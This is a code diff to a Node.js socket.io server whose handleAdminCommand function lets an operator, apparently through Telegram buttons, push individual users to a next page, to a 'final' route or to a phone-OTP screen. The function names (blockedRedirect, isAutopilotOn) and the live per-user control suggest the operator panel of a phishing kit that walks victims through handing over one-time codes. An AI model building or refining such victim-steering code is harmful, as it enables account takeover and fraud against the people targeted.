@@ -395,14 +395,37 @@ function blockedRedirect(db) {
   };
 }
 
-function handleAdminCommand({ userId, command, otp, io }) {
-  // same code your dashboard uses
-  console.log("handling command:", userId, command)
-  const payload = { userId, command };
-    if (command === "phone-otp" && otpValue) payload.otp = otpValue;
+async function handleAdminCommand({ userId, command, otp, io, db }) {
+  console.log("handling command:", userId, command);
 
-    io.emit("admin:command", payload);
-    console.log(`📤 command '${command}' to user ${userId} by Tg button`, payload);
+  // Find the specific socket for this user
+  for (let [id, socket] of io.of("/").sockets) {
+    if (socket.userId === userId) {
+      let link = null;
+      let phonescreen = null;
+
+      if (command === "nextpage") {
+        const user = await db.get("SELECT page FROM users WHERE id = ?", [userId]);
+        link = await getNextPage(user?.page);
+        console.log("link", link);
+      } else if (command === "redirect") {
+        link = resolveFrontendRoute("final");
+      } else if (command === "phone-otp") {
+        phonescreen = resolveFrontendRoute("otp");
+      }
+
+      if (link) {
+        socket.emit("user:command", { command: "redirect", link });
+      } else if (otp) {
+        socket.emit("user:command", { command: "phone-otp", code: otp, phonescreen });
+      } else {
+        socket.emit("user:command", { command });
+      }
+
+      console.log(`📤 Command '${command}' sent to user ${userId} via Tg button`);
+      break;
+    }
+  }
 }
 
 async function isAutopilotOn(db) {
